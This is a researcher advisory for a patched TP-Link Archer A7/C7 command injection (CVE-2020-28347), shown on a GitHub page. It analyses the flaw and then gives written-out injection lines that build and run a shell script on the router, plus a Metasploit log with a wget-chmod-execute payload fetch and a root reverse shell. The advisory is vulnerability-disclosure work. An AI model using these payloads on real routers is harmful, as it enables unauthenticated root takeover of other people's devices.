
  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frdomanski%2FExploits_and_Advisories%2Fblob%2Fmaster%2Fadvisories%2FPwn2Own%2FTokyo2020%2Fminesweeper.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=rdomanski%2FExploits_and_Advisories)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rdomanski](/rdomanski)
/
**[Exploits\_and\_Advisories](/rdomanski/Exploits_and_Advisories)**
Public

* [Notifications](/login?return_to=%2Frdomanski%2FExploits_and_Advisories) You must be signed in to change notification settings
* [Fork
  20](/login?return_to=%2Frdomanski%2FExploits_and_Advisories)
* [Star
   111](/login?return_to=%2Frdomanski%2FExploits_and_Advisories)

* [Code](/rdomanski/Exploits_and_Advisories)
* [Issues
  1](/rdomanski/Exploits_and_Advisories/issues)
* [Pull requests
  0](/rdomanski/Exploits_and_Advisories/pulls)
* [Discussions](/rdomanski/Exploits_and_Advisories/discussions)
* [Actions](/rdomanski/Exploits_and_Advisories/actions)
* [Projects
  0](/rdomanski/Exploits_and_Advisories/projects)
* [Security](/rdomanski/Exploits_and_Advisories/security)
* [Insights](/rdomanski/Exploits_and_Advisories/pulse)

Additional navigation options

* [Code](/rdomanski/Exploits_and_Advisories)
* [Issues](/rdomanski/Exploits_and_Advisories/issues)
* [Pull requests](/rdomanski/Exploits_and_Advisories/pulls)
* [Discussions](/rdomanski/Exploits_and_Advisories/discussions)
* [Actions](/rdomanski/Exploits_and_Advisories/actions)
* [Projects](/rdomanski/Exploits_and_Advisories/projects)
* [Security](/rdomanski/Exploits_and_Advisories/security)
* [Insights](/rdomanski/Exploits_and_Advisories/pulse)

## Files

 master
## Breadcrumbs

1. [Exploits\_and\_Advisories](/rdomanski/Exploits_and_Advisories/tree/master)
2. /[advisories](/rdomanski/Exploits_and_Advisories/tree/master/advisories)
3. /[Pwn2Own](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own)
4. /[Tokyo2020](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own/Tokyo2020)
/
# minesweeper.md

Copy path Blame  Blame
## Latest commit

## History

[History](/rdomanski/Exploits_and_Advisories/commits/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md)208 lines (147 loc) · 12.2 KB master
## Breadcrumbs

1. [Exploits\_and\_Advisories](/rdomanski/Exploits_and_Advisories/tree/master)
2. /[advisories](/rdomanski/Exploits_and_Advisories/tree/master/advisories)
3. /[Pwn2Own](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own)
4. /[Tokyo2020](/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own/Tokyo2020)
/
# minesweeper.md

Top
## File metadata and controls

* Preview
* Code
* Blame

208 lines (147 loc) · 12.2 KB[Raw](https://github.com/rdomanski/Exploits_and_Advisories/raw/refs/heads/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md)
# minesweeper

---

# Summary

This advisory describes a command injection vulnerability that was found by **Pedro Ribeiro (@pedrib1337 | pedrib@gmail.com)** and **Radek Domanski (@RabbitPro | radek.domanski@gmail.com)** and was supposed to be presented at [Zero Day Initiative](https://www.zerodayinitiative.com/) **Pwn2Own Tokyo 2020** competition in November 2020 (see below why "supposed").

The vulnerability exists in the tdpServer daemon (*/usr/bin/tdpServer*), running on the router TP-Link Archer A7 and C7 (AC1750), hardware version 5, MIPS Architecture, firmware versions 200721 and 200628 respectively.

This vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host.

All function offsets and code snippets in this advisory were taken from */usr/bin/tdpServer*, firmware version 200721 of A7 model.

During Pwn2Own 2019 we pwned the same service. Technical details of that exploit and details on the tdpServer are public and can be found here:

* [ZDI: Exploiting the TP-Link Archer A7 at Pwn2Own Tokyo](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo)
* [Pedro's 2019 advisory](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md)
* [Radek's 2019 advisory](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md)

Therefore, we refer to those publications to understand inner working of the service and in this advisory we will only focus on differences to an exploit from 2019.

## We never got to use it...

This vulnerability was patched by TP-Link on [firmware 201029 for the A7 version](https://static.tp-link.com/2020/202011/20201104/Archer%20A7%28US%29_V5_201029.zip) and [201030 for the C7 version](https://static.tp-link.com/2020/202011/20201104/Archer%20C7%28EU%29_V5_201030.zip). The patch was dropped one day before the competition, wiping out a lot of Pwn2Own contestants, including us, so the exploit described below was never used in the competition.

We have updated the [Metasploit module that we released last year](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/tplink_archer_a7_c7_lan_rce.rb) with the new injection technique. This new technique also works with the older firmware that we exploited last year!

[CVE-2020-28347](https://nvd.nist.gov/vuln/detail/CVE-2020-28347) has been assigned for this vulnerability.

A copy of this advisory can be found at:

* [Pedro's GitHub repository](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2020/minesweeper.md)
* [Radek's GitHub repository](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md)

Enjoy!

~ Team Flashback

# Vulnerability Details

## Background on *tdpServer*

The *tdpServer* daemon listens on port 20002/udp on interface 0.0.0.0. The whole functionality of the daemon is not fully understood by the authors, as this was unnecessary for exploitation. However, the daemon seems to be a bridge between the TP-Link mobile application and the router, allowing to establish some sort of control channel from the mobile application.

The daemon communicates with the mobile application through the use of UDP packets, with an encrypted payload.

For technical details on how tdpServer works and processes encrypted packets please refer to the publications of [*lao\_bomb*](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/lao_bomb/lao_bomb.md) referenced above (from our [Pwn2Own 2019 whitepaper](https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2019/lao_bomb.md)).

## Understanding the vulnerability

TP-Link patched the original CVE-2020-10882 vulnerability which was described as:

> This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link Archer A7 Firmware Ver: 190726 AC1750 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the tdpServer service, which listens on UDP port 20002 by default. When parsing the slave\_mac parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the root user.

So the original vulnerability was a command injection in the prepared string that was passed to system():

```
(...)
  print_debug("tdpOneMesh.c:3363","Sync wifi for specified mac %s start.....",slaveMac);
  memset(systemCmd,0,0x200);
  snprintf(systemCmd,0x1ff,
    "lua -e \'require(\"luci.controller.admin.onemesh\"). \
    sync_wifi_specified({mac=\"%s\"})\'",slaveMac);
  print_debug("tdpOneMesh.c:3368","systemCmd: %s",systemCmd);
  system(systemCmd);
  print_debug("tdpOneMesh.c:3370","Sync wifi for specified mac %s end.....",slaveMac);
(...)
```
> Snippet 1: Vulnerability exploited by us in Pwn2Own 2019 (CVE-2020-10882)

The fix by TP-Link removed the call to system() and instead used Lua C bindings to invoke a lua script:

```
print_debug("tdpOneMesh.c:3401", "Sync wifi for specified mac %s start.....", slave_mac);
lua_onemesh_call(slave_mac);
```
> Snippet 2: Call to lua\_onemesh\_call (0x416164)

This removed the possibility for a command injection on the system() call, since it doesn't exist any more.

However, looking at the lua\_onemesh\_call() is can be observed that the "luci.controller.admin.onemesh" lua script is still invoked. It uses a special function named "dispatch" that passes an argument and executes a handler for a requested function. In this case it will be a request to execute sync\_wifi\_specified(slave\_mac). slave\_mac is an argument that we control when we send the UDP packet.

```
lua_pcall_obj = lua_pcall("luci.controller.admin.onemesh");
if (lua_pcall_obj != 0) {
	iVar1 = lua_get_table_and_call(lua_pcall_obj,"dispatch",arg,&PTR_s_form_0041aac0,0);
```
> Snippet 3: lua\_onemesh\_call (0x4171ac)

At this point a deeper look at how lua scripts work in the router is needed. Lua scripts are compiled so we need to understand its disassembly. Fortunately, lua is a stack based language so it is relatively easy to understand its logic.

The sync\_wifi\_specified() is quite long so only the vulnerable part is presented here:

```
  179 [-]: GETTABLE  R10 R0 K0    ; R10 := R0["mac"]
  180 [-]: SETTABLE  R9 K51 R10   ; R9["target_id"] := R10
  181 [-]: GETUPVAL  R10 U2       ; R10 := U2
  182 [-]: GETTABLE  R10 R10 K40  ; R10 := R10["encode"]
  183 [-]: MOVE      R11 R9       ; R11 := R9
  184 [-]: CALL      R10 2 2      ; R10 := R10(R11)
  185 [-]: GETUPVAL  R11 U0       ; R11 := U0
  186 [-]: GETTABLE  R11 R11 K52  ; R11 := R11["printf"]
  187 [-]: LOADK     R12 K53      ; R12 := "ubus call sync sync_wifi \'"
  188 [-]: MOVE      R13 R10      ; R13 := R10
  189 [-]: LOADK     R14 K54      ; R14 := "\' &"
  190 [-]: CONCAT    R12 R12 R14  ; R12 := concat(R12 to R14)
  191 [-]: CALL      R11 2 1      ;  := R11(R12)
  192 [-]: GETUPVAL  R11 U4       ; R11 := U4
  193 [-]: GETTABLE  R11 R11 K55  ; R11 := R11["fork_call"]
  194 [-]: LOADK     R12 K53      ; R12 := "ubus call sync sync_wifi \'"
  195 [-]: MOVE      R13 R10      ; R13 := R10
  196 [-]: LOADK     R14 K54      ; R14 := "\' &"
  197 [-]: CONCAT    R12 R12 R14  ; R12 := concat(R12 to R14)
  198 [-]: CALL      R11 2 1      ;  := R11(R12)
  199 [-]: LOADBOOL  R11 1 0      ; R11 := true
  200 [-]: RETURN    R11 2        ; return R11
  201 [-]: RETURN    R0 1         ; return
```
> Snippet 4: Disassembly of sync\_wifi\_specified() in luci.controller.admin.onemesh

Our controlled parameter (slave\_mac) is assigned to a key "target\_id". A command is constructed using printf which is next passed to the fork\_call lua function. As it can be seen in lines 187 - 189, json content is injected and the actual command prototype is: `ubus call sync sync_wifi '<json>' &`.

As our controlled parameter is not sanitized before constructing the json we can escape the json context and execute commands within the scope of the lua script process, which runs as root. Effectively a following command will be executed by the lua and run in a shell:

```
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"<Controlled_Parameter>"}' &
```

# Exploitation

## Reaching the vulnerable function

To reach a vulnerable function we need to construct and encrypt a packet with specific parameters. As the packet structure is the same as described in the previous advisory we will not discuss it here. Please refer to [last year's advisory for details](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo).

## Achieving code execution

Similarly to CVE-2020-10882 we are still limited by the 0x11 characters that we can use. strncpy() copies the slave\_mac\_info key into the slaveMac variable:

`strncpy(slave_mac,*(char **)(iVar6 + 0x10),0x11);`.

strncpy() doesn't null-terminate the destination string by default, so the usable length is supposedly to be 16 characters. However, we are saved by two things:

1. at the beginning of the function the whole buffer space is memset to 0 (`memset(slave_mac,0,0x424);`);
2. due to byte alignment, the slave\_mac variable is actually at least 0x12 (18) chars. This means that even if we send 17 characters, the string will always be null terminated.

So even if we inject 17 characters, the string will always be null terminated, which is essential for the exploit to succeed. Note that it might be possible to inject more characters at once, but this was the quickest path to success, and we did not focus on efficiency.

Since we have the same limitations to last year's exploit, we need to use a similar approach of printing character by character into a file and execute it as a shell script in the last step.
In addition, escaping needs to be done differently:

```
'`<PAYLOAD\>`'

```

A running exploit looks like this:

```
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf ';'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf '.'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf '/'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`printf 'q'>>b`'"}' &
ubus call sync sync_wifi '{"load":"/tmp/onemesh_sync_wifi_tmp_json","timeout":5,"target_id":"'`sh b`'"}' &
```
> Snippet 5: Example of sending payload char by char

### PoC

```
msf6 > use exploit/linux/misc/minesweeper
[*] Using configured payload linux/mipsbe/shell_reverse_tcp
msf6 exploit(linux/misc/minesweeper) > set rhost 192.168.0.1
rhost => 192.168.0.1
msf6 exploit(linux/misc/minesweeper) > set lhost 192.168.0.100
lhost => 192.168.0.100
msf6 exploit(linux/misc/minesweeper) > set srvhost 192.168.0.100
srvhost => 192.168.0.100
msf6 exploit(linux/misc/minesweeper) > run

[*] Started reverse TCP handler on 192.168.0.100:4444
[*] Attempting to exploit TP-Link Archer A7/C7 (AC1750) v5 (firmware 200721)
[*] Starting up our web service on http://192.168.0.100:8080 ...
[*] Using URL: http://192.168.0.100:8080/r
[*] 192.168.0.1:20002 - Connecting to the target
[*] 192.168.0.1:20002 - Sending command file byte by byte
[*] 192.168.0.1:20002 - Command: wget http://192.168.0.100:8080/r;chmod +x r;./r
[*] 192.168.0.1:20002 - [0%]= = => - - - - - - - - - - - - - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = => - - - - - - - - - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = => - - - - - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = = = = = => - - - -[100%]
[*] 192.168.0.1:20002 - [0%]= = = = = = = = = = = = = = = = = = =>[100%]
[*] 192.168.0.1:20002 - Command file sent, attempting to execute...
[+] 192.168.0.1:20002 - Sending executable to the router
[+] 192.168.0.1:20002 - Sit back and relax, Shelly will come visit soon!
[*] Command shell session 1 opened (192.168.0.100:4444 -> 192.168.0.1:57818) at 2020-11-01 21:53:30 +0700
[*] Server stopped.

uid=0(root) gid=0(root)
uname -a
Linux ArcherA7v5 3.3.8 #1 Tue Jul 14 22:44:46 CST 2020 mips GNU/Linux
```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


